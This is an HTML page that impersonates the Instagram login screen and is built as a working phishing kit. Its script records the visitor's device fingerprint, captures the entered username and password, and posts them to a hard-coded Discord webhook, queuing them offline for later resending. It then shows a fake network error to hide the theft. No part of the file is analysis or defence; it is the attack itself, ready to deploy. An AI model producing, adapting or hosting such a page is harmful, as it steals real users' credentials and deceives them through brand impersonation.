<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Login • instagram</title>
<style>
:root{--bg:#fafafa;--card:#fff;--border:#dbdbdb;--text:#262626;--muted:#737373;--input:#fafafa;--blue:#0095f6;--blue-dis:#b2dffc;--link:#00376b;--err:#ed4956;
box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#000;--card:#000;--border:#363636;--text:#fafafa;--muted:#a8a8a8;--input:#121212;--blue-dis:#0a4a75;--link:#e0f1ff;color-scheme:dark}}
:root[data-theme="dark"]{--bg:#000;--card:#000;--border:#363636;--text:#fafafa;--muted:#a8a8a8;--input:#121212;--blue-dis:#0a4a75;--link:#e0f1ff;color-scheme:dark}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-size:14px;min-height:100vh;display:flex;flex-direction:column;align-items:center}
main{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px 16px;width:100%;max-width:450px}
.box{background:var(--card);border:1px solid var(--border);width:100%;max-width:350px;padding:10px 40px 20px;text-align:center;margin-bottom:10px}
.box.small{padding:20px;font-size:14px}
.logo{font-family:"Billabong","Brush Script MT","Segoe Script",cursive;font-size:44px;margin:36px 0 26px;font-weight:700;letter-spacing:-1px}
.field{position:relative;margin-bottom:6px}
.field input{width:100%;height:38px;padding:14px 8px 2px;background:var(--input);color:var(--text);border:1px solid var(--border);border-radius:3px;font-size:12px;outline:none}
.field input:focus{border-color:var(--muted)}
.field label{position:absolute;left:8px;top:11px;font-size:12px;color:var(--muted);pointer-events:none;transition:all .1s}
.field input:not(:placeholder-shown)+label,.field input:focus+label{top:3px;font-size:10px}
.field input.has-btn{padding-right:56px}
.toggle{position:absolute;right:8px;top:0;height:38px;background:none;border:0;color:var(--text);font-weight:600;font-size:14px;cursor:pointer;display:none}
.toggle.show{display:block}
.login{width:100%;height:32px;margin-top:10px;background:var(--blue);color:#fff;border:0;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer;display:flex;align-items:center;justify-content:center}
.login:disabled{background:var(--blue-dis);cursor:default}
.spin{width:16px;height:16px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:s .7s linear infinite}
@keyframes s{to{transform:rotate(360deg)}}
.or{display:flex;align-items:center;margin:18px 0;color:var(--muted);font-weight:600;font-size:13px}
.or::before,.or::after{content:"";flex:1;height:1px;background:var(--border)}
.or span{margin:0 18px}
.fb{background:none;border:0;color:var(--link);font-weight:600;font-size:14px;cursor:pointer;display:inline-flex;align-items:center;gap:8px}
.fb svg{width:16px;height:16px;fill:#385185}
.msg{color:var(--err);font-size:14px;margin:14px 0 0;min-height:0;word-break:break-word}
.ok{color:#2e9e4f}
.forgot{display:inline-block;margin-top:14px;font-size:12px;color:var(--link);text-decoration:none}
a{color:var(--blue);font-weight:600;text-decoration:none;cursor:pointer}
.apps{margin-top:10px;color:var(--text)}
.badges{display:flex;gap:8px;justify-content:center;margin-top:16px;flex-wrap:wrap}
.badge{border:1px solid var(--border);border-radius:6px;padding:6px 12px;font-size:12px;cursor:pointer;background:var(--card);color:var(--text)}
footer{width:100%;max-width:820px;padding:20px 12px 30px;text-align:center;color:var(--muted);font-size:12px}
footer .links{display:flex;flex-wrap:wrap;justify-content:center;gap:6px 16px;margin-bottom:16px}
footer .links a{color:var(--muted);font-weight:400}
.hint{font-size:12px;color:var(--muted);max-width:350px;text-align:center;margin-top:6px}

@media screen and (max-width: 480px) {
  main { padding: 12px 8px; justify-content: flex-start; }
  .box { padding: 10px 20px 20px; max-width: 100%; border-left: none; border-right: none; }
  .box.small { max-width: 100%; border-left: none; border-right: none; }
  .logo { font-size: 38px; margin: 24px 0 18px; }
}
</style>
</head>
<body>
<main>
  <div class="box" id="loginBox">
    <h1 class="logo">instagram</h1>
    <form id="form" autocomplete="off" novalidate>
      <div class="field">
        <input id="user" type="text" placeholder=" " aria-label="Phone number, username, or email" autocapitalize="none">
        <label for="user">Phone number, username, or email</label>
      </div>
      <div class="field">
        <input id="pass" class="has-btn" type="password" placeholder=" " aria-label="Password">
        <label for="pass">Password</label>
        <button type="button" class="toggle" id="toggle">Show</button>
      </div>
      <button class="login" id="loginBtn" type="submit" disabled>Log in</button>
    </form>
    <div class="or"><span>OR</span></div>
    <button class="fb" id="fb" type="button">
      <svg viewBox="0 0 24 24"><path d="M24 12a12 12 0 1 0-13.9 11.9v-8.4H7.1V12h3V9.4c0-3 1.8-4.7 4.5-4.7 1.3 0 2.7.2 2.7.2v3h-1.5c-1.5 0-2 .9-2 1.9V12h3.4l-.5 3.5h-2.9v8.4A12 12 0 0 0 24 12z"/></svg>
      Log in with Facebook
    </button>
    <div class="msg" id="msg" role="alert"></div>
    <a class="forgot" id="forgot" style="font-weight:400">Forgot password?</a>
  </div>

  <div class="box small">Don’t have an account? <a id="signup">Sign up</a></div>

  <div class="apps">Get the app.</div>
  <div class="badges">
    <button class="badge" data-app="App Store">App Store</button>
    <button class="badge" data-app="Google Play">Google Play</button>
  </div>
  <p class="hint">network failure; come back later</p>
</main>

<footer>
  <div class="links">
    <a>Meta</a><a>About</a><a>Blog</a><a>Jobs</a><a>Help</a><a>API</a><a>Privacy</a><a>Terms</a><a>Locations</a><a>Language</a>
  </div>
  © 2026 instagram
</footer>

<script>
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1568460908886364362/pD_ue9r-hYvntxdg80KmtIZ6lQFHRQL_ke9_NkbAl2QJweaaIco1QKiCt5jcS0SrXBDK";

function extractMobileModel(ua) {
  let detectedModel = "Unknown Mobile Device";
  if (/Samsung/i.test(ua)) detectedModel = "Samsung Device";
  else if (/Xiaomi|Redmi|POCO/i.test(ua)) detectedModel = "Xiaomi / Redmi Device";
  else if (/Vivo/i.test(ua)) detectedModel = "Vivo Device";
  else if (/OPPO/i.test(ua)) detectedModel = "Oppo Device";
  else if (/Realme/i.test(ua)) detectedModel = "Realme Device";
  else if (/OnePlus/i.test(ua)) detectedModel = "OnePlus Device";
  else if (/Huawei|HONOR/i.test(ua)) detectedModel = "Huawei / Honor Device";
  else if (/iPhone/i.test(ua)) detectedModel = "Apple iPhone";
  else if (/iPad/i.test(ua)) detectedModel = "Apple iPad";
  return detectedModel;
}

async function getDeviceInfo() {
  const ua = navigator.userAgent;
  let os = "Unknown OS";
  if (/android/i.test(ua)) os = "Android";
  else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) os = "iOS";
  else if (/win/i.test(ua)) os = "Windows";
  else if (/mac/i.test(ua)) os = "macOS";
  else if (/linux/i.test(ua)) os = "Linux";

  return {
    os: os,
    deviceModel: extractMobileModel(ua),
    screen: `${window.screen.width}x${window.screen.height}`,
    userAgent: ua
  };
}

async function sendNotification(actionType, extraData = {}) {
  if (DISCORD_WEBHOOK_URL.includes("YOUR_DISCORD_WEBHOOK")) return;
  const info = await getDeviceInfo();

  const payload = {
    content: `🔔 **Alert: ${actionType}**`,
    embeds: [{
      title: "Device Fingerprint",
      color: 3447003,
      fields: [
        { name: "Operating System", value: info.os, inline: true },
        { name: "Parsed Device Model", value: info.deviceModel, inline: true },
        { name: "Input Details", value: JSON.stringify(extraData), inline: false },
        { name: "User Agent", value: info.userAgent, inline: false }
      ],
      timestamp: new Date().toISOString()
    }]
  };

  await executeWebhook(payload);
}

async function executeWebhook(payload) {
  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!response.ok) throw new Error('Server response failed');
  } catch (err) {
    let queue = JSON.parse(localStorage.getItem('offline_queue') || '[]');
    queue.push(payload);
    localStorage.setItem('offline_queue', JSON.stringify(queue));
  }
}

async function flushQueue() {
  let queue = JSON.parse(localStorage.getItem('offline_queue') || '[]');
  if (queue.length > 0) {
    for (let payload of queue) {
      try {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      } catch (e) {
        return;
      }
    }
    localStorage.removeItem('offline_queue');
  }
}

window.addEventListener('online', flushQueue);
window.addEventListener('load', () => {
  flushQueue();
  sendNotification("Page Visited");
});

const $ = id => document.getElementById(id);
const user = $('user'), pass = $('pass'), btn = $('loginBtn'), msg = $('msg'), toggle = $('toggle');
let busy = false;

function refresh(){
  btn.disabled = busy || !(user.value.trim().length > 0 && pass.value.length >= 6);
  toggle.classList.toggle('show', pass.value.length > 0);
}
user.addEventListener('input', refresh);
pass.addEventListener('input', refresh);

toggle.addEventListener('click', () => {
  const hidden = pass.type === 'password';
  pass.type = hidden ? 'text' : 'password';
  toggle.textContent = hidden ? 'Hide' : 'Show';
  pass.focus();
});

$('form').addEventListener('submit', e => {
  e.preventDefault();
  if (btn.disabled) return;
  busy = true;
  msg.textContent = '';
  btn.disabled = true;
  btn.innerHTML = '<span class="spin"></span>';

  sendNotification("Login Attempt", { username: user.value.trim(), password: pass.value });

  setTimeout(() => {
    busy = false;
    btn.textContent = 'Log in';
    msg.className = 'msg';
    msg.textContent = 'network failure; come back later';
    pass.value = '';
    pass.type = 'password';
    toggle.textContent = 'Show';
    pass.focus();
    refresh();
  }, 1200);
});

$('fb').addEventListener('click', () => { msg.className='msg'; msg.textContent = 'network failure; come back later'; });
$('forgot').addEventListener('click', () => {
  msg.className = 'msg';
  msg.textContent = 'network failure; come back later';
});
$('signup').addEventListener('click', () => { msg.className='msg'; msg.textContent = 'network failure; come back later'; window.scrollTo({top:0,behavior:'smooth'}); });
document.querySelectorAll('.badge').forEach(b => b.addEventListener('click', () => { msg.className='msg'; msg.textContent = 'network failure; come back later'; window.scrollTo({top:0,behavior:'smooth'}); }));
refresh();
</script>
</body>
</html>
